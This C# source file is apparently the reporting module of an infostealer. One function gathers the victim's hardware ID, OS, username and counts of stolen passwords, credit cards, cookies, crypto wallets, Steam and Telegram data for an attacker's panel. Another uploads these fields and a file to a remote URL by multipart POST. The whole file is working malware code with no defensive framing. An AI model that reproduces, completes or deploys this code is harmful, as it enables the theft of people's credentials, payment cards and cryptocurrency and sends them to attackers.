namespace who.APIs
{
    using System;
    using System.Collections.Specialized;
    using System.IO;
    using System.Net;
    using Microsoft.Win32;
    using who.Func;

    public static class Post_File
    {
        public static NameValueCollection name = new NameValueCollection();

        public static void GetInfoForPanel()
        {
            if (Directory.Exists(Dirs.WorkDir + "\\Wallets"))
                Dirs.LogPC.Add("[✅] Crypto");

            string bit = Environment.Is64BitOperatingSystem ? "x64" : "x32";

            string HKLM_GetString(string path, string key)
            {
                try
                {
                    using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(path))
                    {
                        return rk == null ? "" : (string)rk.GetValue(key);
                    }
                }
                catch { return ""; }
            }

            string hwid = User.GetHwid();
            string os = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
        //    string bit = "";
            string Profilee = "profileCount";
            string PassCount = Convert.ToString(Passwords.PassCounts);
            string CCCount = CC.Count.ToString();
            
            string Telegram = "0";
            string cookiesCount = Convert.ToString(Cookies.cookiesCount);
            string Steam = "0";
            string cryptoCount = "0";
            string autofillsCount = Convert.ToString(AutoFills.Count);

            if (Directory.Exists(Dirs.WorkDir + "\\Wallets"))
                cryptoCount = new DirectoryInfo(Dirs.WorkDir + "\\Wallets").GetDirectories().Length.ToString();

            if (Directory.Exists(Dirs.WorkDir + "\\Steam"))
                Steam = "1";

            if (Directory.Exists(Dirs.WorkDir + "\\Telegram"))
                Telegram = "1";

            string DesktopFiles;
            if (Directory.Exists(Dirs.WorkDir + "\\Desktop"))
                DesktopFiles = new DirectoryInfo(Dirs.WorkDir + "\\Desktop").GetFiles().Length.ToString();




            name.Add("hwid", hwid);
            name.Add("os", os);
            name.Add("platform", bit);
            name.Add("profile", Profilee);
            name.Add("user", Environment.UserName);
            name.Add("passwordsCount", PassCount);
            name.Add("cccount", CCCount);
            name.Add("ccount", cryptoCount);
            name.Add("fcount", "null");
            name.Add("telegram", Telegram);
            //autofills
            name.Add("cookies", cookiesCount);
            name.Add("steam", Steam);
            

        }

        public static void HttpUploadFile(string url, string file, string paramName, string contentType, NameValueCollection nvc)
        {
            string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
            byte[] boundarybytes = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");
            byte[] boundarybytesF = System.Text.Encoding.ASCII.GetBytes("--" + boundary + "\r\n");


            HttpWebRequest wr = (HttpWebRequest)WebRequest.Create(url);
            wr.Method = "POST";
            wr.KeepAlive = true;
            wr.Credentials = CredentialCache.DefaultCredentials;
            wr.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
            var nvc2 = new NameValueCollection
            {
                { "Accepts-Language", "en-us,en;q=0.5" }
            };
            wr.Headers.Add(nvc2);
            wr.ContentType = "multipart/form-data; boundary=" + boundary;


            using (Stream rs = wr.GetRequestStream())
            {
                bool firstLoop = true;
                string formdataTemplate = "Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}";
                foreach (string key in nvc.Keys)
                {
                    if (!firstLoop)
                    {
                        rs.Write(boundarybytes, 0, boundarybytes.Length);
                    }
                    else
                    {
                        rs.Write(boundarybytesF, 0, boundarybytesF.Length);
                        firstLoop = false;
                    }
                    string formitem = string.Format(formdataTemplate, key, nvc[key]);
                    byte[] formitembytes = System.Text.Encoding.UTF8.GetBytes(formitem);
                    rs.Write(formitembytes, 0, formitembytes.Length);
                }
                rs.Write(boundarybytes, 0, boundarybytes.Length);

                string headerTemplate = "Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n";
                string header = string.Format(headerTemplate, paramName, new FileInfo(file).Name, contentType);
                byte[] headerbytes = System.Text.Encoding.UTF8.GetBytes(header);
                rs.Write(headerbytes, 0, headerbytes.Length);

                using (var fileStream = new FileStream(file, FileMode.Open, FileAccess.Read))
                {
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)
                    {
                        rs.Write(buffer, 0, bytesRead);
                    }
                }

                byte[] trailer = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "--\r\n");
                rs.Write(trailer, 0, trailer.Length);
            }

            try
            {
                using (var wresp = wr.GetResponse())
                {
                    using (Stream stream2 = wresp.GetResponseStream())
                    {
                        using (var reader2 = new StreamReader(stream2))
                        {
                            reader2.Read();
                        }
                    }
                }
            }
            catch (Exception)
            {

            }
        }
    }
}